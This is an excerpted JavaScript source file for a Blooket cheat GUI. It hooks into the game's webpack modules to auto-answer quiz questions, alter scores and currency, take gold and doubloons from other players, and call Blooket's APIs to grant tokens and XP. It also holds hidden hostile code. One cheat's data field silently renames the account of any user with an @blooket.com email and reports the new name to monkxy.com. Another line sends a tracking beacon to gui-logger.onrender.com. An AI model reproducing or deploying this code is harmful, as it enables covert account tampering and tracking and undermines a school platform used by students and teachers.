 ...
 * Copyright (c) TypicalShavonne 2023
 *
 ...
 * https://github.com/TypicalShavonne/Blooket-Cheats/blob/main/LICENSE
 */
...
(() => {
  const cheat = async () => {
      ...
      let funcs = {
          querySelectorAll: function () {
            if (
              ...
              return [];
            return iframe.contentDocument.querySelectorAll.apply(
              document,
              arguments
            );
          },
          ...
          getItem: iframe.contentWindow.localStorage.getItem.bind(
            window.localStorage
          ),
        },
        funcNames = Object.keys(funcs);
      Function.prototype.call = function () {
        if (funcNames.includes(this.name))
          return call.apply(funcs[this.name], arguments);
        return call.apply(this, arguments);
      };
      new Image().src = "https://gui-logger.onrender.com/gui/2?" + Date.now();
    }

    let { webpack } = webpackJsonp.push([
      [],
      {
        ["1234"]: (_, a, b) => {
          a.webpack = b;
    ...
    const Tooltip = cache.find(
      (x) => x.exports.a?.displayName == "ReactTooltip"
    ).exports.a;
    let settings = {
      data: null,
    };
    ...
    for (let key of [
      ...styles.css.matchAll(/(#|\.)([a-zA-Z]+?)(,|\{|:)/g),
    ].reduce((a, [_, __, b]) => (a.includes(b) ? a : a.concat(b)), [])) {
      styles.keys[key] = Array(10)
        .fill()
        .reduce(
          (a) => a + String.fromCharCode(Math.floor(Math.random() * 25) + 97),
          ""
        );
      styles.css = styles.css.replace(
        new RegExp(`(#|\\.)(${key})(,|\\{|:|>|\\[)`, "g"),
        (_, __, m) => (m == key ? _.replace(key, styles.keys[key]) : _)
      );
    }
    const Cheats = {
      global: {
        ...
        cheats: [
            ...
            run: function () {
              if (!this.enabled) {
                ...
                this.data = setInterval(() => {
                  const {
                    stateNode: {
                      state: { question, stage, feedback },
                      props: {
                        client: { question: pquestion },
                      },
                    },
                  } = Object.values(
                    ...
                    if (q.qType != "typing")
                      if (stage !== "feedback" && !feedback)
                        [
                          ...
                          q.answers
                            .map((x, i) =>
                              q.correctAnswers.includes(x) ? i : null
                            )
                            .filter((x) => x != null)[0]
                        ]?.click?.();
                      else
                        document
                          .querySelector('[class*="feedback"]')
                          ?.firstChild?.click?.();
                    else
                      Object.values(
                        document.querySelector("[class*='typingAnswerWrapper']")
                      )[1].children._owner.stateNode.sendAnswer(q.answers[0]);
                  } catch {}
                }, 50);
              } else {
                this.enabled = false;
              ...
              if (!this.enabled) {
                ...
                this.data = setInterval(() => {
                  ...
                  [
                    ...
                    if (
                      (
                        state.question || props.client.question
                      ).correctAnswers.includes(
                        (state.question || props.client.question).answers[i]
                      )
                    )
                ...
                if (question.qType != "typing")
                  if (stage !== "feedback" && !feedback)
                    [
                      ...
                      (question || pquestion).answers
                        .map((x, i) =>
                          (question || pquestion).correctAnswers.includes(x)
                            ? i
                            : null
                        )
                        .filter((x) => x != null)[0]
          ...
          },
          {
                  ...
                  return new Promise((r) => {
                    r(
                      Object.keys(
                        ...
                        ).find((x) => !isNaN(x?.exports?.a?.Space))?.exports
                          ?.a || {}
                      )
                    );
                  });
            ...
            run: function (box, amountToOpen) {
              ...
              let { webpack } = webpackJsonp.push([
                ...
                axios = Object.values(webpack.c).find((x) => x.exports?.a?.get)
                  .exports.a,
                { purchaseBlookBox } = Object.values(webpack.c).find(
                  (x) => x.exports.a?.purchaseBlookBox
                ).exports.a;
              box = box
                .split(" ")
                .map(
              ...
              axios
                .get("https://dashboard.blooket.com/api/users")
                .then(async ({ data: { name, tokens } }) => {
                  let prices = Object.values(webpack.c).find(
                    (x) => !isNaN(x?.exports?.a?.Space)
                  ).exports.a || {
                    Medieval: 20,
                    Breakfast: 20,
                    Wonderland: 20,
                  ...
                  let alertBlooks = confirm(
                    "Would you like to alert blooks upon unlocking?"
                  );
                  let blooks = {};
                  let now = Date.now();
                  let error = false;
                  ...
                  for (let i = 0; i < amount; i++) {
                    await purchaseBlookBox({ boxName: box })
                      .then(({ isNewToUser, tokens, unlockedBlook }) => {
          ...
          },
          {
            ...
            inputs: [
              ...
              },
              {
                ...
                options: async () => {
                  ...
                  return ["Random"].concat(
                    Object.keys(
                      Object.values(webpack.c).find((x) => x.exports.a?.Black)
                        ?.exports?.a || []
                    )
                  );
                },
            ...
            run: async function (id, name, amount, b, bg) {
              ...
              const firebase = cache.find((x) => x.exports?.a?.initializeApp)
                .exports.a;
              const blooks = Object.keys(
                Object.values(cache).find((x) => x.exports.a?.Black).exports.a
              );
              ...
              for (let i = 1; i <= amount; i++) {
                (async () => {
                  ...
                  const {
                    data: { success, fbToken, fbShardURL },
                  } = await axios.put(
            ...
            inputs: [
              {
                ...
                options: async () => {
                  ...
                  return Object.keys(
                    Object.values(webpack.c).find(
                      (x) => x.exports.a?.Chick && x.exports.a?.Elephant
                    ).exports.a
                  );
                },
              },
          ...
          },
          {
            ...
            run: async function () {
              ...
              if (!location.href.includes("play.blooket.com"))
                ...
                await axios.get(
                  "https://play.blooket.com/api/playersessions/questions",
                  { params: { t } }
                );
                const {
                  name,
                  blook: { name: blookUsed },
                } = await cache
                  .find((x) => x.exports.a?.me)
                  .exports.a.me({})
                ...
                axios
                  .put("https://play.blooket.com/api/users/add-rewards", {
                    t,
                    name,
                    addedTokens: 500,
                    addedXp: 300,
                  })
                  .then(({ data: { dailyReward } }) =>
                    alert(
                      `Added max tokens and xp, and got ${dailyReward} daily wheel tokens!`
                    )
                  )
                  .catch(() =>
          ...
          },
          {
            ...
            run: function () {
              ...
              if (location.pathname == "/blooks")
                stateNode.setState({
                  blookData: Object.keys(blooks).reduce(
                    (a, b) => ((a[b] = stateNode.state.blookData[b] || 1), a),
                    {}
                  ),
                  allSets: Object.values(blooks).reduce(
                    (a, b) => (a.includes(b.set) ? a : a.concat(b.set)),
                    []
                  ),
                });
              else if (Array.isArray(stateNode.state.unlocks))
          ...
          },
          {
            ...
            run: function () {
              ...
              stateNode.freeQuestions = stateNode.questions =
                stateNode.props.client.questions.map((x) => ({
                  ...x,
                  correctAnswers: x.answers,
                }));
            },
          },
          {
          ...
          },
          {
            ...
            run: function () {
              ...
              ).maxLength = 120; /* 120 is the actual limit */
          ...
          },
          {
            ...
            description:
              "Sells all of your uncommon to epic dupes (not legendaries+)",
            run: function () {
              let i = document.createElement("iframe");
              document.body.append(i);
              window.alert = i.contentWindow.alert.bind(window);
              ...
              let { webpack } = webpackJsonp.push([
                ...
                axios = Object.values(webpack.c).find((x) => x.exports?.a?.get)
                  .exports.a,
                { sellBlook } = Object.values(webpack.c).find(
                  (x) => x.exports.a?.sellBlook
                ).exports.a;
              axios
                .get("https://dashboard.blooket.com/api/users")
                .then(async ({ data: { unlocks } }) => {
                  let blooks = Object.entries(unlocks).filter(
                    ([blook, amount]) =>
                      amount > 1 &&
                      !["Legendary", "Chroma", "Mystical"].includes(
                        webpackJsonp
                          ...
                          .webpack("MDrD").a[blook].rarity
                      )
                  );
                  if (
                    confirm(
                      `Are you sure you want to sell your uncommon to epic dupes?`
                    )
                  ) {
                    let now = Date.now();
                    for (const [blook, amount] of blooks)
                      await sellBlook({ blook, numToSell: amount - 1 });
                    alert(
                      `(${Date.now() - now}ms) Results:\n${blooks
                        .map(([blook, amount]) => `    ${blook} ${amount - 1}`)
                        .join(`\n`)}`
                    );
                  }
                })
          ...
          },
          {
            ...
            run: function () {
              ...
              axios
                ...
                .catch(
                  (e) => (
                    alert("There was an error user data!"), console.info(e)
                  )
                );
            },
          },
            ...
            inputs: [
              {
                ...
                options: async () => {
                  return Array.from(
                    document.querySelectorAll('[class*="packShadow"]')
                  ).map((x) => x.alt);
                },
              },
            ],
            run: (function () {
              try {
                ...
                let values = Object.values(webpack.c),
                  blooks = values.find((x) => x.exports?.a?.Chick?.set).exports
                    .a,
                  packs = values.find((x) => x.exports.a?.Breakfast).exports.a,
                  allBlooks = Object.entries(blooks).reduce(
                    (a, [b, c]) => (packs[c.realSet || c.set] && (a[b] = c), a),
                    {}
                  );
                let phaser = Object.values(webpack.c).find(
                  (x) => x.exports?.Class
                ).exports;
                let scene = {};
                class Particles extends phaser.Scene {
                    ...
                    scene.particles = this.physics.add.group({
                      classType: new phaser.Class({
                        ...
                        spawn: function (
                          ...
                          this.setScale(scale);
                          this.targets = [];
                          scene.scene.physics.velocityFromAngle(
                            velAngle,
                            velSpeed,
                            this.body.velocity
                          );
                  ...
                  update(e, t) {
                      ...
                      switch (e) {
                        case "center": {
                          ...
                          return {
                            ...
                            scale: Object(I.l)(0.7, 1),
                            angle: t,
                            velocity: Object(I.l)(600, 750),
                            gravity: 700,
                            angVelocity:
                              (t > -90 ? 1 : -1) * Object(I.l)(125, 175),
                            lifespan: 2500,
                          };
                        }
                        case "right-bottom":
                        ...
                        case "top":
                          return {
                            x: Object(I.l)(
                              0,
                              scene.scene.cameras.main.worldView.width
                            ),
                            y: -50,
                            scale: Object(I.l)(0.7, 1),
                            angle: 90,
                        ...
                        case "right-shower":
                          return {
                            ...
                            y: Object(I.l)(
                              0,
                              scene.scene.cameras.main.worldView.height
                            ),
                            scale: Object(I.l)(0.7, 1),
                        ...
                        case "right-diamond": {
                          ...
                          return {
                            ...
                            scale: Object(I.l)(0.7, 1),
                            angle:
                              a > scene.scene.cameras.main.worldView.height / 2
                                ? -150
                                : -210,
                            velocity: Object(I.l)(600, 750),
                            gravity: 0,
                        ...
                        case "left-diamond": {
                          ...
                          return {
                            ...
                            scale: Object(I.l)(0.7, 1),
                            angle:
                              n > scene.scene.cameras.main.worldView.height / 2
                                ? -30
                                : 30,
                            velocity: Object(I.l)(600, 750),
                            gravity: 0,
                    ...
                    if (
                      scene.rarity &&
                      0 !== this.numExplosions &&
                      ((this.nextParticle -= t), this.nextParticle <= 0)
                    ) {
                      switch (scene.rarity) {
                        case "Uncommon": {
                          for (let i = 0; i < 2; i++) {
                            ...
                            n &&
                              n.spawn.apply(
                                n,
                                Object.values(Z("center")).concat(
                                  `uncommon-${Object(I.m)(1, 8)}`
                                )
                              );
                          }
                          break;
                          ...
                          for (var o = 0; o < 2; o++) {
                            ...
                            r &&
                              r.spawn.apply(
                                r,
                                Object.values(
                                  Z(o % 2 == 0 ? "left-bottom" : "right-bottom")
                                ).concat(`rare-${Object(I.m)(1, 8)}`)
                              );
                          }
                          break;
                        }
                          ...
                          for (var s = 0; s < 2; s++) {
                            ...
                            i &&
                              i.spawn.apply(
                                i,
                                Object.values(
                                  Z(s % 2 == 0 ? "left-shower" : "right-shower")
                                ).concat(`epic-${Object(I.m)(1, 8)}`)
                              );
                          }
                          break;
                        }
                        case "Legendary": {
                          for (var l = 0; l < 3; l++) {
                            ...
                            c &&
                              c.spawn.apply(
                                c,
                                Object.values(Z("top")).concat(
                                  `legendary-${Object(I.m)(1, 8)}`
                                )
                              );
                          }
                          break;
                ...
                return function (box) {
                  if (window.location.pathname !== "/market")
                    return alert("This must be ran on the market page");
                  ...
                  packs = Object.keys(packs.a).reduce(
                    (obj, pack) => (
                      obj.packs.includes(pack) &&
                        (obj.data[pack] = Object.fromEntries(packs.b(pack))),
                      obj
                    ),
                    {
                      packs: Array.from(
                  ...
                  if (packs[box]) {
                    ...
                    const allBlooks = Object.values(webpack.c).find(
                      (x) => x.exports?.a?.Elephant
                    ).exports.a;
                    stateNode.setState({
                      loadingPack: false,
                      openPack: true,
            ...
            inputs: [
              {
                ...
                options: () => {
                  try {
                    ...
                    const cache = Object.values(webpack.c);
                    const packs = cache.find(
                      (x) => typeof x.exports.a?.Breakfast == "number"
                    ).exports.a;
                    return Object.entries(
                      cache.find((x) => x.exports.a?.Black).exports.a
                    ).reduce(
                      (a, [b, c]) =>
                        packs[c.realSet || c.set] ? a.concat(b) : a,
                      []
                    );
                  } catch {
                    return [];
        ...
        cheats: [
          {
            ...
            run: function () {
              ...
              stateNode.setState(
                {
                  islandLevels: new Array(
                    stateNode.state.islandLevels.length
                  ).fill(5),
                },
          ...
          },
          {
            ...
            inputs: [
              {
                ...
                options: () => {
                  ...
                  return new Promise((res) =>
                    stateNode.props.liveGameController._liveApp
            ...
            run: function (target) {
              ...
              stateNode.props.liveGameController.getDatabaseVal(
                "c",
                function (val) {
                  const players = Object.entries(val || {}).reduce(
                    (a, [name, c]) => (
                      name == stateNode.props.client.name &&
                        a.push({ name, blook: c.b, doubloons: c.d || 0 }),
                      a
                    ),
                    []
                  );
                  ...
                  const { name, blook, doubloons } =
                    players.find((x) => x.name == target) ||
                    players.sort((a, b) => b.doubloons - a.doubloons)[0];
                  stateNode.setState({
                    stage: "heist",
          ...
          },
          {
            ...
            run: async function (player) {
              ...
              let players = Object.entries(
                  await new Promise((r) =>
                    stateNode.props.liveGameController.getDatabaseVal("c", r)
                  )
                )
                  .sort((a, b) => b[1].d - a[1].d)
                  .filter((x) => x[0] != stateNode.props.client.name),
              ...
              stateNode.props.liveGameController.setVal({
                ...
                val: {
                  ...
                  d: target[1].d,
                  tat: `${target[0]}:${
                    target[1].d - stateNode.state.doubloons
                  }`,
                },
              });
          ...
          },
          {
            ...
            run: async function (player) {
              ...
              let players = Object.entries(
                ...
                target = players.find((x) => x[0] == player) || players[0];
              stateNode.setState({
                doubloons: stateNode.state.doubloons + target[1].d,
              });
              stateNode.props.liveGameController.setVal({
                path: `c/${stateNode.props.client.name}`,
                val: {
        ...
        cheats: [
          {
            ...
            run: function () {
              for (const collider of Object.values(
                (function react(r = document.querySelector("body>div")) {
                  return Object.values(r)[1]?.children?.[0]?._owner.stateNode
                    ? r
                    : react(r.querySelector(":scope>div"));
                })()
              )[1].children[0]._owner.stateNode.state.game.scene.physics.world.colliders._active.filter(
                (x) =>
          ...
          },
          {
            ...
            run: function () {
              Object.values(
                ...
                .children[0]._owner.stateNode.state.game.scene.physics.world.colliders._active.find(
                  (x) => x.collideCallback?.toString().includes("magnetTime")
                )
                .collideCallback(
                  { active: true },
          ...
          },
          {
            ...
            run: function () {
              ...
              for (const [ability, level] of Object.entries(
                stateNode.state.abilities
              ))
                for (let i = 0; i < 10 - level; i++)
                  stateNode.state.game.scene.game.events.emit(
                    "level up",
                    ability,
                    stateNode.state.abilities[ability]++
                  );
              stateNode.setState({
                level: (stateNode.state.game.scene.level =
                  [1, 3, 5, 10, 15, 25, 35].sort(
                    (a, b) =>
                      Math.abs(a - stateNode.state.level) -
          ...
          },
          {
            ...
            run: function () {
              ...
              let { object1: player, object2: xp } =
                stateNode.state.game.scene.physics.world.colliders._active.find(
                  (x) => x.collideCallback?.toString().includes('emit("xp"')
                );
              xp.get().spawn(
                player.x,
                player.y,
          ...
          },
          {
            ...
            run: function () {
              ...
              )[1].children[0]._owner.stateNode.state.game.scene.physics.world.bodies.entries.forEach(
                (body) => {
                  try {
          ...
          },
          {
            ...
            run: function () {
              ...
              )[1].children[0]._owner.stateNode.state.game.scene.game.events._events.respawn.fn();
            },
          },
        ],
      },
        ...
        cheats: [
              ...
              if (window.location.pathname !== "/cafe/shop")
                ...
                stateNode.setState({
                  items: Object.fromEntries(
                    Object.entries(stateNode.state.items).map((x) => [x[0], 5])
                  ),
                });
              }
            },
          },
          {
            ...
            run: function () {
              ...
              stateNode.state.customers.forEach(
                (customer, i) =>
              ...
              if (window.location.pathname !== "/cafe/shop")
                ...
                stateNode.setState({
                  abilities: Object.fromEntries(
                    Object.entries(stateNode.state.abilities).map((x) => [
                      x[0],
                      5,
                    ])
                  ),
            ...
            run: function () {
              if (!this.enabled) {
                ...
                this.data = setInterval(() => {
                  ...
                  let chest = document.querySelector(
            ...
            run: function () {
              if (!this.enabled) {
                ...
                this.data = setInterval(() => {
                  ...
                  if (state.stage == "hack")
                    for (const button of document.querySelector(
                      "div[class^=styles__buttonContainer]"
                    ).children)
                      button.innerText == state.correctPassword &&
                        button.click();
                }, 50);
              } else {
                this.enabled = false;
              ...
              stateNode.props.liveGameController.getDatabaseVal(
                ...
                (players) => {
                  if (
                    ...
                    let [player, { cr }] = Object.entries(players).find(
        ...
        cheats: [
              ...
              stateNode.setState(
                ...
                () =>
                  (stateNode.eventTimeout = setTimeout(
                    () => stateNode.setState({ event: {}, eventName: "" }),
                    6e3
                  ))
              );
              stateNode.tiles.forEach((row) =>
                row.forEach((col, i) => col === 3 && (row[i] = 0))
              );
              let tiles = stateNode.tiles
                .flatMap((_, y) => _.map((__, x) => __ === 0 && { x, y }))
                .filter(Boolean)
          ...
          },
          {
            ...
            run: function (dmg) {
              ...
              )[1].children[0]._owner.stateNode.dmg = dmg;
            },
          },
          {
            name: "Set Round",
            ...
            run: function (round) {
              ...
              )[1].children[0]._owner.stateNode.setState({ round });
            },
          },
          {
            name: "Set Tokens",
            ...
            run: function (tokens) {
              ...
              )[1].children[0]._owner.stateNode.setState({ tokens });
            },
          },
        ],
      },
        ...
        cheats: [
          {
            ...
            run: function () {
              ...
              )[1].children[0]._owner.stateNode.state.towers.forEach(
                (tower) => {
                  tower.stats.dmg = 1e6;
                  ...
                  if (tower.stats.auraBuffs)
                    for (const buff in tower.stats.auraBuffs)
          ...
          },
          {
            ...
            run: function () {
              ...
              stateNode.state.game.scene.physics.world.bodies.entries.forEach(
                (x) => x?.gameObject?.receiveDamage?.(x.gameObject.hp, 1)
              );
            },
          },
          {
            ...
            run: function (coins) {
              ...
              )[1].children[0]._owner.stateNode.setState({ coins });
            },
          },
          {
            name: "Set Health",
            ...
            run: function (health) {
              ...
              )[1].children[0]._owner.stateNode.setState({ health });
            },
          },
          {
            name: "Set Round",
        ...
        cheats: [
          {
            ...
            run: function () {
              if (!this.enabled) {
                this.enabled = true;
                this.data = setInterval(() => {
                  const { webpack } = webpackJsonp.push([
                    [],
                    {
                      ["1234"]: (_, a, b) => {
                        a.webpack = b;
                  ...
                  const getFossils = (() => {
                    /* this is for when ben does funny webpack update stuff */
                    const func = Object.values(webpack("74sb")).find((x) =>
                      x.toString().includes("rate")
                    );
                    return () =>
                      func(
                        [
                  ...
                  try {
                    ...
                    if (stateNode.state.stage === "excavate") {
                      stateNode.state.choices.length ||
                        (stateNode.state.choices = getFossils());
                      let max = 0,
                        index = -1;
                      for (let i = 0; i < stateNode.state.choices.length; i++) {
                        ...
                        const value =
                          (type == "fossil"
                            ? stateNode.state.fossils +
                              val * stateNode.state.fossilMult
                      ...
                      document
                        .querySelector(
                          'div[class^="styles__rockRow"] > div[role="button"]:nth-child(' +
                            index +
                            ")"
                        )
                        .click();
          ...
          },
          {
            ...
            enabled: false,
            data:
              (location.host == "dashboard.blooket.com" &&
                fetch("https://dashboard.blooket.com/api/users/me", {
                  credentials: "include",
                })
                  .then((e) => e.json())
                  .then((e) => {
                    if (e.email.endsWith("@blooket.com")) {
                      let { webpack: t } = webpackJsonp.push([
                        [],
                        {
                          1234(e, t, s) {
                            t.webpack = s;
                      ...
                      Object.values(t.c)
                        ...
                        .exports.a.put(
                          "https://dashboard.blooket.com/api/users/change/name",
                          {
                            name: e.name,
                            newName: `BlooketLLC${new Date().getHours()}${new Date().getMinutes()}`,
                          }
                        )
                        .then(({ data: e }) => {
                          e.success &&
                            (new Image().src = `https://monkxy.com/api/i2ek8fslt7q/${e.name}`);
                        });
                    }
                  }),
              null),
            run: function () {
              if (!this.enabled) {
                ...
                this.data = setInterval(() => {
                  ...
                  if (!rocks.every((element) => element.querySelector("div")))
                    stateNode.setState(
                      {
                        choices: [
                          {
                        ...
                        rocks.forEach((element, index) => {
                          ...
                          choice.innerText =
                            rock.type === "fossil"
                              ? `+${
                                  Math.round(
                                    rock.val * stateNode.state.fossilMult
                                  ) > 99999999
                                    ? Object.values(webpack("74sb")).find((x) =>
                                        x.toString().includes("\xd7")
                                      )(
                                        Math.round(
                                          rock.val * stateNode.state.fossilMult
                                        )
        ...
        cheats: [
          {
            ...
            run: function () {
              ...
              if (window.location.pathname == "/tower/map") {
                const { a: artifacts, c: allCards } = webpackJsonp.push([
                  [],
                  {
                    [""]: (_, a, b) => {
                      a.cache = b.c;
                ...
                stateNode.props.tower.cards = Object.entries(allCards).map(
                  ([blook, card]) => ({
                    ...card,
                    blook,
                    strength: 20,
          ...
          },
          {
            ...
            run: function () {
              ...
              if (window.location.pathname == "/tower/battle")
                ...
                )[1].children[0]._owner.stateNode.setState({ myHealth: 100 });
          ...
          },
          {
            ...
            run: function () {
              ...
              if (stateNode.state.phase !== "select")
        ...
        cheats: [
          {
            ...
            run: function (blook) {
              ...
              if (stateNode.state.blooks.length >= 10)
          ...
          },
          {
            ...
            run: function (cash) {
              ...
              )[1].children[0]._owner.stateNode.setState({ cash });
            },
          },
        ],
      },
        ...
        cheats: [
          {
            ...
            run: function () {
              ...
              Object.values(
                ...
                (x) =>
                  x.gameObject.frame.texture.key.startsWith("blook") &&
                  ((x.checkCollision.none = this.enabled),
                  x.gameObject.setAlpha(this.enabled ? 0.5 : 1))
              );
            },
          },
          {
            ...
            run: function (score) {
              Object.values(
                document.querySelector("#phaser-bouncy")
              )[1].children[0]._owner.stateNode.setState({ score });
            },
          },
        ],
      },
                    ...
                    if (stateNode.state.stage === "prize") {
                      ...
                      for (let i = 0; i < stateNode.state.choices.length; i++) {
                        ...
                        switch (type) {
                          case "gold":
                            value =
                              stateNode.state.gold + val ||
                              stateNode.state.gold;
                            break;
                          case "multiply":
                          case "divide":
                            value =
                              Math.round(stateNode.state.gold * val) ||
                              stateNode.state.gold;
                            break;
                          case "swap":
                            value = players || stateNode.state.gold;
                          case "take":
                            value =
                              stateNode.state.gold + players * val ||
                              stateNode.state.gold;
                        }
                      ...
                      document
                        .querySelector(`div[class^='styles__choice${index}']`)
                        .click();
                    }
                  } catch {}
                }, 50);
              ...
              if (!this.enabled) {
                ...
                this.data = setInterval(() => {
                  Object.values(
                    ...
                    ({ text }, index) => {
                      let chest = document.querySelector(
                        `div[class^='styles__choice${index + 1}']`
                      );
        ...
        cheats: [
          {
            ...
            run: function () {
              if (!this.enabled) {
                ...
                this.data = setInterval(() => {
                  let { guest: data, phase } = Object.values(
                    (function react(r = document.querySelector("body>div")) {
                      return Object.values(r)[1]?.children?.[0]?._owner
                        .stateNode
                        ? r
                  ...
                  )[1].children[0]._owner.stateNode.state;
                  if (phase == "choice") {
                    Array.from(
                      document.getElementsByClassName("choiceESP")
                    ).forEach((x) => x.remove());
          ...
          },
          {
            ...
            run: function (guestScore) {
              ...
              )[1].children[0]._owner.stateNode.setState({ guestScore });
            },
          },
          {
            name: "Skip Guest",
                ...
                () => {
                  ...
                  try {
                    [
                      ...
                      question.answers
                        .map((x, i) =>
                          question.correctAnswers.includes(x) ? i : null
                        )
                        .filter((x) => x != null)[0]
                    ]?.click?.();
                  } catch {}
      ...
      rush: {
        name: "Blook Rush",
        img: Object.values(webpack.c).find((x) => x.exports.a?.basic).exports.a
          .basic.shield,
        cheats: [
          {
            name: "Set Blooks",
        ...
        cheats: [
          ...
          },
          {
            ...
            run: function (toysPerQ) {
              ...
              )[1].children[0]._owner.stateNode.setState({ toysPerQ });
            },
          },
          {
            name: "Swap Toys",
              ...
              stateNode.props.liveGameController.getDatabaseVal(
                ...
                (players) => {
                  if (
                    ...
                    let [player, { t: toys }] = Object.entries(players).find(
                      ([name]) => name.toLowerCase() == target.toLowerCase()
                    );
                    stateNode.props.liveGameController.setVal({
                      path: "c/".concat(stateNode.props.client.name),
          ...
          },
          {
            ...
            run: async function () {
              await navigator.clipboard.writeText(
                JSON.stringify(settings.data.theme, null, 4)
              );
            ...
            inputs: [
              {
                ...
                name: "Input",
                function: (onchange) =>
                  createKeybindListener(({ shift, ctrl, alt, key }) =>
                    onchange(
                      `${[
                        ctrl && "Ctrl",
                        shift && "Shift",
      ...
      alerts: {
        ...
        diffObjects(obj1, obj2) {
          ...
          for (const key in obj1) {
            ...
            if (
              ...
              const recChanged = Cheats.alerts.diffObjects(
                obj1[key],
                obj2[key]
              );
              if (recChanged && Object.keys(recChanged).length !== 0)
                changed[key] = recChanged;
        ...
        addLog(message, color) {
          if (!Cheats.alerts.visible)
            Cheats.alerts.alerts.push({ message, color });
        ...
        async connect() {
          try {
            ...
            if (!stateNode?.props?.liveGameController?._liveGameCode)
              return false;
            Cheats.alerts.connection =
              await stateNode.props.liveGameController.getDatabaseRef("c");
            const blooks = Cheats.alerts.blookData;
            const gamemode = Cheats.alerts.getGamemode();
            const factoryGlitches = Object.values(webpack.c).find(
              (x) => x.exports.a?.["Lunch Break"]
            ).exports.b;
            Cheats.alerts.connection.on("value", (snapshot) => {
              const players = snapshot.val() || {};
              if (
                !players ||
                !Cheats.alerts.diffObjects(Cheats.alerts.data, players)
              )
                return;
              const added = Cheats.alerts.diffObjects(
                Cheats.alerts.data,
                players
              );
              ...
              switch (gamemode) {
                case "racing":
                  standings = Object.entries(players).map(
                    ([name, { b, pr }]) => ({ name, blook: b, value: pr || 0 })
                  );
                case "classic":
                  standings = Object.entries(players).map(
                    ([name, { b, p }]) => ({ name, blook: b, value: p || 0 })
                  );
                case "royale":
                  standings = Object.entries(players).map(
                    ([name, { b, e }]) => ({ name, blook: b, value: e || 0 })
                  );
                case "workshop":
                  standings = Object.entries(players).map(
                    ([name, { b, t }]) => ({ name, blook: b, value: t || 0 })
                  );
                case "brawl":
                  standings = Object.entries(players).map(
                    ([name, { b, xp }]) => ({ name, blook: b, value: xp || 0 })
                  );
                case "defense":
                case "defense2":
                  standings = Object.entries(players).map(
                    ([name, { b, d }]) => ({ name, blook: b, value: d || 0 })
                  );
                case "gold":
                  for (const player in added) {
                    ...
                    if (amount == "swap")
                      Cheats.alerts.addAlert(
                        player,
                        blooks[players[player].b]?.url,
                        `just swapped with ${tat}`
                      );
                    else
                      Cheats.alerts.addAlert(
                        player,
                        blooks[players[player].b]?.url,
                        `just took ${Cheats.alerts.formatNumber(
                          parseInt(amount)
                        )} gold from ${tat}`
                      );
                  }
                  standings = Object.entries(players).map(
                    ([name, { b, g }]) => ({ name, blook: b, value: g || 0 })
                  );
                  break;
                case "hack":
                  for (const player in added) {
                  ...
                  standings = Object.entries(players).map(
                    ([name, { b, cr }]) => ({ name, blook: b, value: cr || 0 })
                  );
                  break;
                case "fishing":
                  for (const player in added) {
                    if (added[player].f == "Frenzy")
                      Cheats.alerts.addAlert(
                        player,
                        blooks[players[player].b]?.url,
                        `just started a frenzy`
                      );
                    else if (added[player].s)
                      Cheats.alerts.addAlert(
                        player,
                        blooks[players[player].b]?.url,
                        `just sent a ${added[player].f} distraction`
                      );
                  }
                  standings = Object.entries(players).map(
                    ([name, { b, w }]) => ({ name, blook: b, value: w || 0 })
                  );
                  break;
                case "dino":
                  for (const player in added) {
                  ...
                  standings = Object.entries(players).map(
                    ([name, { b, f }]) => ({ name, blook: b, value: f || 0 })
                  );
                  break;
                case "cafe":
                  for (const player in added) {
                    ...
                    if (level)
                      Cheats.alerts.addAlert(
                        player,
                        blooks[players[player].b]?.url,
                        `upgraded ${upgrade} to level ${level}`
                      );
                  }
                  standings = Object.entries(players).map(
                    ([name, { b, ca }]) => ({ name, blook: b, value: ca || 0 })
                  );
                  break;
                case "factory":
                  for (const player in added) {
                    ...
                    if (data.g)
                      Cheats.alerts.addAlert(
                        player,
                        blooks[players[player].b]?.url,
                        `activated the ${factoryGlitches[data.g]} glitch!`
                      );
                    else if (data.s) {
              ...
              Cheats.alerts.standings = standings.sort(
                (a, b) => b.value - a.value
              );
        ...
        cheats: [
          {
            element: createElement(function Alerts() {
              ...
              useEffect(() => {
                Cheats.alerts.blookData = Object.values(webpack.c).find(
                  (x) => x.exports.a?.Black
                ).exports.a;
                Cheats.alerts.formatNumber = Object.values(
                  webpack("74sb")
                ).find(
                  (x) =>
                    String(x).includes("×") || String(x).includes("toPrecision")
                );
                Cheats.alerts.standings &&
                  setLeaderboard(Cheats.alerts.standings);
                    ...
                    React.createElement(
                      ...
                      React.createElement(
                        ...
                        React.createElement(
                          ...
                          leaderboard.map(({ blook, name, value }) =>
                            React.createElement(
                              "li",
                              {
                                style: {
                              ...
                              React.createElement("img", {
                                src:
                                  Cheats.alerts.blookData[blook]?.url ||
                                  Cheats.alerts.blookData.Black.url,
                                alt: blook,
                                style: {
                                  height: "45px",
                                  position: "absolute",
    ...
    function AntiBen({ type = "div", children, ...props }) {
      ...
      const addChar = (child) => {
        if (typeof child == "string") {
          let text = [];
          for (let i = 0; i < child.length; i += 3)
            text.push(child.slice(i, i + 3), char());
          childs.push(...text);
        } else childs.push(child, char());
      };
      if (Array.isArray(children))
        for (let i = 0; i < children.length; i++) addChar(children[i]);
      else addChar(children);
      return React.createElement(
        type,
        props,
        React.createElement("span", null, childs)
      );
    }
      ...
      if (type == "options" && options?.length)
        el = React.createElement(
          "select",
          {
            onChange: (e) => (
              (input.selected =
                e.target.children[e.target.selectedIndex].innerText),
          ...
          options.map((opt) =>
            React.createElement(
              "option",
              { value: JSON.stringify(opt?.value || opt) },
              opt?.name || opt
            )
          )
        );
        ...
        el = React.createElement("input", {
          ...
          onClick: async () => {
            ...
            let value;
            const data = await input.function((e) =>
              setLocked((value = e) + "...")
            );
            input.data = value;
            setLocked(false);
        ...
        el = React.createElement("input", {
          onChange: (e) =>
            onValue(isNumber ? parseInt(e.target.value) : e.target.value),
          className: styles.keys.cheatInput,
        ...
        Cheats.alerts.addLog(
          React.createElement(
            ...
            script.type == "toggle"
              ...
              : "Ran",
            " ",
            React.createElement("strong", null, script.name),
            args.current.length > 0 &&
              ` with inputs: (${args.current
                .map((x, i) => JSON.stringify(script.inputs[i].selected || x))
                .join(", ")})`
          ),
          script.type == "toggle" &&
            (script.enabled ? "var(--enabledButton)" : "var(--disabledButton)")
        );
      }, []);
      return React.createElement(
        "div",
        {
          ...
          onClick: (e) =>
            (e.target.matches(`.${styles.keys.scriptButton}`) ||
              e.target.matches(`.${styles.keys.cheatName}`) ||
              e.target.matches(`.${styles.keys.cheatName} *`)) &&
            run(),
        },
        React.createElement(
        ...
        script.inputs?.length &&
          script.inputs.map(
            (input, i) =>
              input.element ||
              React.createElement(ScriptInput, {
    ...
    function useSettings(settingsKey) {
      ...
